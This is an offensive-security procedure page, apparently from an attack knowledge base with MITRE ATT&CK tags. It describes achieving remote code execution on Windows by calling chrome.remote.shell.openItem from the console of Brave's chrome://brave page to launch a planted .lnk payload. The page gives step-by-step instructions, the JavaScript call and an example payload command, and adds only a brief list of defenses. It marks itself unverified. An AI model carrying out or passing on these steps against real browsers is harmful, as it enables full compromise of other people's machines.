---
id: proc-uuid-3
tags:
  - rce
  - api-exploitation
  - chrome-remote-shell
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/chrome-remote-shell-openitem-temp]]'
  - '[[commands/chrome-remote-shell-openitem-a]]'
verified: false
platforms:
  - Microsoft Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:31.259Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Execute-RCE-on-chrome-brave-Page

## Summary

This procedure uses the exposed chrome.remote.shell API on the loaded 'chrome://brave' page to open local .lnk files or executables, achieving remote code execution on the Windows host.

## Description

Once chrome://brave loads, the page provides access to Brave/Chromium internals, including chrome.remote.shell.openItem for launching local items. Create a .lnk shortcut to a payload (e.g., cmd.exe /c calc.exe) in C:\temp\, then invoke via JS in console. Targets unpatched Brave on Windows; impact is full system compromise.

## Requirements

1. Successful loading of chrome://brave page
2. Pre-placed .lnk file on target system (e.g., via prior access or user instruction)
3. Browser console access on the page

## Defense

Defensive measures and detection strategies:

- Update Brave to block remote shell APIs
- Restrict chrome:// access via policy
- Monitor for .lnk executions and anomalous process spawns (e.g., via EDR)

## Objectives

1. Invoke local file execution via API
2. Run arbitrary commands or payloads
3. Confirm RCE with visible effects (e.g., app launch)

## Instructions

### Step 1: Access Browser Console

**Context**: Open dev tools on chrome://brave page.

**Instructions**: Right-click > Inspect > Console tab.

> Expected: Console ready for JS input.

### Step 2: Execute API Call

**Context**: Use openItem to launch .lnk.

**Command** ([[commands/chrome-remote-shell-openitem-temp]]):

```javascript
chrome.remote.shell.openItem("C://temp//test.lnk");
```

> Executes the shortcut; replace path with payload .lnk pointing to command like calc.exe. Expected: Payload runs silently or visibly.

### Step 3: Verify Execution

**Context**: Check for side effects.

**Instructions**: Observe if linked app opens; use task manager for processes.

> Expected: RCE confirmed by command output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] Command and Scripting Interpreter: JavaScript
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/chrome-remote-shell-openitem-temp]]
- [[commands/chrome-remote-shell-openitem-a]]

## Tools Used


## Tags

- [[rce]]
- [[api-exploitation]]
